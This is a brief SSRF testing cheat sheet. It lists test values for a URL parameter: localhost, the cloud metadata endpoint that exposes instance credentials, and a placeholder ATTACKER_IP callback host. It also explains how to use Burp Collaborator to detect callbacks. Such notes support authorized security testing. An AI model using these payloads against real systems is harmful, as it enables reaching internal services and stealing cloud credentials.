# Server-Side Request Forgery (SSRF)

## Quick Test

url=http://127.0.0.1:80
url=http://169.254.169.254/latest/meta-data/
url=http://<ATTACKER_IP>:8000/


## With Burp Collaborator

- Replace target URL with collaborator payload
- Monitor for callbacks
